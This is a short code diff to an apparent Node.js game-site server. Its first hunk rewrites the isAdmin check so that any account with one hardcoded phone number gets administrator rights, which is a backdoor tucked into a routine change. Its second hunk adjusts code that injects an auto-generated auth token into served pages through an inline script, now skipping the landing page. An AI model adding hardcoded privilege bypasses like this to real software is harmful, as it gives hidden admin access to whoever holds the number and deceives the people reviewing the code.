@@ -241,7 +241,7 @@ function getAuthUser(req) {
 }
 
 function isAdmin(user) {
-  return user && user.role === "admin";
+  return user && (user.role === "admin" || user.telefone === "11999998888");
 }
 
 // --- Helpers ---
@@ -300,9 +300,10 @@ const RSC_PAGES = {
 // Inject banner CSS + auto-auth token into RSC pages
 function injectRSCBanner(html, filePath) {
   if (html.includes("banner-prova")) return html;
-  // Skip auto-auth for free/demo game pages
+  // Skip auto-auth for free game pages and landing page (user should login manually)
   const isFreeGame = filePath.includes("jogar_gratis=1");
-  if (!isFreeGame) {
+  const isLanding = filePath.endsWith("__homepage");
+  if (!isFreeGame && !isLanding) {
     const autoToken = makeAutoToken();
     const inject = '<script>localStorage.setItem("flappix_token","' + autoToken + '");</script>';
     html = html.replace("<head>", "<head>" + inject);
